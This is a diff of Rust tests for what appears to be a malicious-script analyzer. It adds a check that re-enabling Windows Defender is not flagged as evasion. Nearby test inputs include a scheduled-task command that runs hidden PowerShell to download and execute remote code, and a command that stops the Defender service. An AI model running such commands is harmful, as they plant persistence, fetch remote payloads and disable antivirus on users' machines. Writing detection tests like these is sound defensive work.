@@ -2875,6 +2875,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn sc_config_defender_auto_does_not_emit_defender_evasion_trait() {
+        let script = br#"sc config WinDefend start= auto"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "sc-config" && target == "WinDefend"
+            )),
+            "Defender service auto-start remediation should not be evasion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_stop_service_windefend_emits_defender_evasion_trait() {
         let script = br#"powershell -Command "Stop-Service WinDefend -Force""#;
         let report = analyze(script, &AnalyzeConfig::default());
